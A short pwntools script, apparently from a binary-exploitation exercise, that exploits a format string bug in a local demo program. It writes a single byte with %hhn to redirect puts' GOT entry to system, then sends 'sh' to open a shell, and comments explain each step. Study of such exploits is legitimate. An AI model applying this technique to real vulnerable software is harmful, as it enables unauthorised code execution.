#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./demo_fmt')

# "set follow-fork-mode parent" is required for gdb to run without error
# puts_got = 0x404018 -> from 0x401090 jump to 0x401030
# plt can be found by stepping into the instruction right at the call instruction on specified build-in function
# system_plt = 0x4010b0
# puts got can be found by typing "got" command in pwndbg
puts_got = 0x404018

# Convert 0x50 to 0xb0 by format string vulnerability
# 8th parameter is puts_got
# 176 = 0xb0
# %176c%8$hhn: write b0 to the start of 8th parameter which is originally 50
# The AAAAA is for padding since in 64-bit architecture each address is aligned with 8 bytes
# length of padding = 8*k - len("%176c%8$hhn") where k is an non-negative integer
# In this case k = 2 and padding = 16-11 = 5
#gdb.attach(r)
r.sendafter("Give me fmt: ", b"%176c%8$hhn" + b"AAAAA" + p64(puts_got))
r.sendafter("Give me string: ", "sh\x00")

r.interactive()